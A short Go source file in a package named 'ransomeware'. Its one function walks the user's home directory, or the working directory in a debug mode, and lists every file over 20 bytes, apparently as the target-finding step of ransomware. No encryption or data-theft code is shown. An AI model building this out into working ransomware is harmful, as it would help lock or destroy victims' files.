package ransomeware

import (
	"fmt"
	"log"
	"os"
	"path/filepath"
)

func GetAllFiles() {
	DEBUG := true
	homeDir, err := os.UserHomeDir()
	if err != nil {
		log.Fatal(err)
	}
	if DEBUG {
		homeDir, err = os.Getwd()
		if err != nil {
			log.Fatal(err)
		}
	}
	fmt.Println(homeDir)
	var files []string
	err = filepath.Walk(homeDir, func(path string, info os.FileInfo, err error) error {
		if !info.IsDir() && info.Size() > 20 {
			files = append(files, path)

			fmt.Println(path)
		}
		return nil
	})
	if err != nil {
		log.Fatal(err)
	}
	for _, file := range files {
		fmt.Println(file)
	}

	//return files, err

}
